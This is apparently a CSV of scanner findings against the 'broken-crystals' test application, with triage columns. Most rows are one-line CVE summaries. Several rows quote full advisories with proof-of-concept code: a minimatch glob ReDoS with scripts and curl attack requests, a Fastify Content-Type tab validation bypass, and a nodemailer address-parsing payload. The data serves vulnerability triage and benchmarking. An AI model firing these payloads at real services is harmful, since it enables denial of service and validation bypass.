finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals-CWE-407-566,dep-check,broken-crystals,CWE-407,high,minimatch:3.1.2,"### Summary `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior. --- ### Details The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960): ```typescript while (fr < fl) { .. if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) { .. return true } .. fr++ } ``` When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k). There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input. Measured timing with n=30 path segments: | k (globstars) | Pattern size | Time | |---------------|--------------|----------| | 7 | 36 bytes | ~154ms | | 9 | 46 bytes | ~1.2s | | 11 | 56 bytes | ~5.4s | | 12 | 61 bytes | ~9.7s | | 13 | 66 bytes | ~15.9s | --- ### PoC Tested on minimatch@10.2.2, Node.js 20. **Step 1 -- inline script** ```javascript import { minimatch } from 'minimatch' // k=9 globstars, n=30 path segments // pattern: 46 bytes, default options const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b' const path = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a' const start = Date.now() minimatch(path, pattern) console.log(Date.now() - start + 'ms') // ~1200ms ``` To scale the effect, increase k: ```javascript // k=11 -> ~5.4s, k=13 -> ~15.9s const k = 11 const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b' const path = Array(30).fill('a').join('/') minimatch(path, pattern) ``` No special options are required. This reproduces with the default `minimatch()` call. **Step 2 -- HTTP server (event loop starvation proof)** The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common: ```javascript // poc1-server.mjs import http from 'node:http' import { URL } from 'node:url' import { minimatch } from 'minimatch' const PORT = 3000 const server = http.createServer((req, res) => { const url = new URL(req.url, `http://localhost:${PORT}`) if (url.pathname !== '/match') { res.writeHead(404); res.end(); return } const pattern = url.searchParams.get('pattern') ?? '' const path = url.searchParams.get('path') ?? '' const start = process.hrtime.bigint() const result = minimatch(path, pattern) const ms = Number(process.hrtime.bigint() - start) / 1e6 res.writeHead(200, { 'Content-Type': 'application/json' }) res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n') }) server.listen(PORT) ``` Terminal 1 -- start the server: ``` node poc1-server.mjs ``` Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell: ``` curl ""http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa"" & ``` Terminal 3 -- while the attack is in-flight, send a benign request: ``` curl -w ""\ntime_total: %{time_total}s\n"" ""http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"" ``` **Observed output (Terminal 3):** ``` {""result"":true,""ms"":""0""} time_total: 4.132709s ``` The server reports `""ms"":""0""` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline: ``` {""result"":true,""ms"":""0""} time_total: 0.001599s ``` --- ### Impact Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.",pending,low,no,1
GRP-broken-crystals-CWE-407-567,trivy,broken-crystals,CWE-407,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-568,trivy,broken-crystals,CWE-407,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-569,trivy,broken-crystals,CWE-407,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-570,trivy,broken-crystals,CWE-407,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-571,trivy,broken-crystals,CWE-407,high,python2.7@2.7.16-2+deb10u1,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-572,trivy,broken-crystals,CWE-407,high,python2.7-minimal@2.7.16-2+deb10u1,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-573,trivy,broken-crystals,CWE-407,high,python3.7@3.7.3-2+deb10u4,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-574,trivy,broken-crystals,CWE-407,high,python3.7-minimal@3.7.3-2+deb10u4,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-575,trivy,broken-crystals,CWE-407,high,minimatch@3.1.2,minimatch: minimatch: Denial of Service due to unbounded recursive backtracking via crafted glob patterns,pending,low,no,1
GRP-broken-crystals-CWE-407-576,trivy,broken-crystals,CWE-407,high,minimatch@5.1.6,minimatch: minimatch: Denial of Service due to unbounded recursive backtracking via crafted glob patterns,pending,low,no,1
GRP-broken-crystals-CWE-413-577,trivy,broken-crystals,CWE-413,medium,linux-libc-dev@4.19.269-1,kernel: A possible deadlock in dm_get_inactive_table in dm- ioctl.c leads to dos,pending,low,no,1
GRP-broken-crystals-CWE-415-578,trivy,broken-crystals,CWE-415,medium,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: Hashing of empty dict strings isn't deterministic,pending,low,no,1
GRP-broken-crystals-CWE-415-579,trivy,broken-crystals,CWE-415,medium,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: Hashing of empty dict strings isn't deterministic,pending,low,no,1
GRP-broken-crystals-CWE-415-580,trivy,broken-crystals,CWE-415,high,linux-libc-dev@4.19.269-1,kernel: tun: avoid double free in tun_free_netdev,pending,low,no,1
GRP-broken-crystals-CWE-416-581,trivy,broken-crystals,CWE-416,medium,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-582,trivy,broken-crystals,CWE-416,medium,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-583,trivy,broken-crystals,CWE-416,medium,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-584,trivy,broken-crystals,CWE-416,medium,iproute2@4.20.0-2+deb10u1,iproute: use-after-free in get_netnsid_from_name in ip/ipnetns.c,pending,low,no,1
GRP-broken-crystals-CWE-416-585,trivy,broken-crystals,CWE-416,medium,libc-bin@2.28-10+deb10u2,glibc: potential use-after-free in getaddrinfo(),pending,low,no,1
GRP-broken-crystals-CWE-416-586,trivy,broken-crystals,CWE-416,medium,libc-dev-bin@2.28-10+deb10u2,glibc: potential use-after-free in getaddrinfo(),pending,low,no,1
GRP-broken-crystals-CWE-416-587,trivy,broken-crystals,CWE-416,medium,libc6@2.28-10+deb10u2,glibc: potential use-after-free in getaddrinfo(),pending,low,no,1
GRP-broken-crystals-CWE-416-588,trivy,broken-crystals,CWE-416,medium,libc6-dev@2.28-10+deb10u2,glibc: potential use-after-free in getaddrinfo(),pending,low,no,1
GRP-broken-crystals-CWE-416-589,trivy,broken-crystals,CWE-416,medium,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-590,trivy,broken-crystals,CWE-416,medium,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-591,trivy,broken-crystals,CWE-416,medium,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-592,trivy,broken-crystals,CWE-416,medium,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-593,trivy,broken-crystals,CWE-416,medium,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-594,trivy,broken-crystals,CWE-416,medium,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-595,trivy,broken-crystals,CWE-416,medium,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-596,trivy,broken-crystals,CWE-416,medium,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-597,trivy,broken-crystals,CWE-416,medium,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-598,trivy,broken-crystals,CWE-416,medium,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-599,trivy,broken-crystals,CWE-416,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-600,trivy,broken-crystals,CWE-416,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-601,trivy,broken-crystals,CWE-416,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-602,trivy,broken-crystals,CWE-416,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-603,trivy,broken-crystals,CWE-416,low,libsepol1@2.8-1,libsepol: use-after-free in __cil_verify_classperms(),pending,low,no,1
GRP-broken-crystals-CWE-416-604,trivy,broken-crystals,CWE-416,low,libsepol1-dev@2.8-1,libsepol: use-after-free in __cil_verify_classperms(),pending,low,no,1
GRP-broken-crystals-CWE-416-605,trivy,broken-crystals,CWE-416,medium,libssl-dev@1.1.1n-0+deb10u4,openssl: Use After Free with SSL_free_buffers,pending,low,no,1
GRP-broken-crystals-CWE-416-606,trivy,broken-crystals,CWE-416,medium,libssl1.1@1.1.1n-0+deb10u4,openssl: Use After Free with SSL_free_buffers,pending,low,no,1
GRP-broken-crystals-CWE-416-607,trivy,broken-crystals,CWE-416,high,libwebp-dev@0.6.1-2+deb10u1,Mozilla: libwebp: Double-free in libwebp,pending,low,no,1
GRP-broken-crystals-CWE-416-608,trivy,broken-crystals,CWE-416,high,libwebp6@0.6.1-2+deb10u1,Mozilla: libwebp: Double-free in libwebp,pending,low,no,1
GRP-broken-crystals-CWE-416-609,trivy,broken-crystals,CWE-416,high,libwebpdemux2@0.6.1-2+deb10u1,Mozilla: libwebp: Double-free in libwebp,pending,low,no,1
GRP-broken-crystals-CWE-416-610,trivy,broken-crystals,CWE-416,high,libwebpmux3@0.6.1-2+deb10u1,Mozilla: libwebp: Double-free in libwebp,pending,low,no,1
GRP-broken-crystals-CWE-416-611,trivy,broken-crystals,CWE-416,high,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: use-after-free in XMLReader,pending,low,no,1
GRP-broken-crystals-CWE-416-612,trivy,broken-crystals,CWE-416,high,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: use-after-free in XMLReader,pending,low,no,1
GRP-broken-crystals-CWE-416-613,trivy,broken-crystals,CWE-416,high,linux-libc-dev@4.19.269-1,kernel: Use after Free in gru_set_context_option leading to kernel panic,pending,low,no,1
GRP-broken-crystals-CWE-416-614,trivy,broken-crystals,CWE-416,medium,openssl@1.1.1n-0+deb10u4,openssl: Use After Free with SSL_free_buffers,pending,low,no,1
GRP-broken-crystals-CWE-416-615,trivy,broken-crystals,CWE-416,high,python2.7@2.7.16-2+deb10u1,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-616,trivy,broken-crystals,CWE-416,high,python2.7-minimal@2.7.16-2+deb10u1,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-617,trivy,broken-crystals,CWE-416,high,python3.7@3.7.3-2+deb10u4,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-618,trivy,broken-crystals,CWE-416,high,python3.7-minimal@3.7.3-2+deb10u4,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-428-619,trivy,broken-crystals,CWE-428,critical,openssh-client@1:7.9p1-10+deb10u2,openssh: Remote code execution in ssh-agent PKCS#11 support,pending,low,no,1
GRP-broken-crystals-CWE-436-620,dep-check,broken-crystals,CWE-436,high,fastify:4.28.1,"### Impact A validation bypass vulnerability exists in Fastify where request body validation schemas specified by Content-Type can be completely circumvented. By appending a tab character (`\t`) followed by arbitrary content to the Content-Type header, attackers can bypass body validation while the server still processes the body as the original content type. For example, a request with `Content-Type: application/json\ta` will bypass JSON schema validation but still be parsed as JSON. This vulnerability affects all Fastify users who rely on Content-Type-based body validation schemas to enforce data integrity or security constraints. The concrete impact depends on the handler implementation and the level of trust placed in the validated request body, but at the library level, this allows complete bypass of body validation for any handler using Content-Type-discriminated schemas. This issue is a regression or missed edge case from the fix for a previously reported vulnerability. ### Patches This vulnerability has been patched in **Fastify v5.7.2**. All users should upgrade to this version or later immediately. ### Workarounds If upgrading is not immediately possible, user can implement a custom `onRequest` hook to reject requests containing tab characters in the Content-Type header: ```javascript fastify.addHook('onRequest', async (request, reply) => { const contentType = request.headers['content-type'] if (contentType && contentType.includes('\t')) { reply.code(400).send({ error: 'Invalid Content-Type header' }) } }) ``` ### Resources - https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/validation.js#L272 - https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/content-type-parser.js#L125 - [Fastify Validation and Serialization Documentation](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/) - https://hackerone.com/reports/3464114",TP,medium,yes,1
GRP-broken-crystals-CWE-436-621,dep-check,broken-crystals,CWE-436,info,nodemailer:6.9.15,"The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target. Payload: `""xclow3n@gmail.com x""@internal.domain` Using the following code to send mail ``` const nodemailer = require(""nodemailer""); let transporter = nodemailer.createTransport({ service: ""gmail"", auth: { user: """", pass: """", }, }); let mailOptions = { from: '""Test Sender"" <your_email@gmail.com>', to: ""\""xclow3n@gmail.com x\""@internal.domain"", subject: ""Hello from Nodemailer"", text: ""This is a test email sent using Gmail SMTP and Nodemailer!"", }; transporter.sendMail(mailOptions, (error, info) => { if (error) { return console.log(""Error: "", error); } console.log(""Message sent: %s"", info.messageId); }); (async () => { const parser = await import(""@sparser/email-address-parser""); const { EmailAddress, ParsingOptions } = parser.default; const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */); if (!parsed) { console.error(""Invalid email address:"", mailOptions.to); return; } console.log(""Parsed email:"", { address: `${parsed.localPart}@${parsed.domain}`, local: parsed.localPart, domain: parsed.domain, }); })(); ``` Running the script and seeing how this mail is parsed according to RFC ``` Parsed email: { address: '""xclow3n@gmail.com x""@internal.domain', local: '""xclow3n@gmail.com x""', domain: 'internal.domain' } ``` But the email is sent to `xclow3n@gmail.com` <img width=""2128"" height=""439"" alt=""Image"" src=""https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d"" /> ### Impact: - Misdelivery / Data leakage: Email is sent to psres.net instead of test.com. - Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts. - Potential compliance issue: Violates RFC 5321/5322 parsing rules. - Domain based access control bypass in downstream applications using your library to send mails ### Recommendations - Fix parser to correctly treat quoted local-parts per RFC 5321/5322. - Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",TP,medium,yes,1
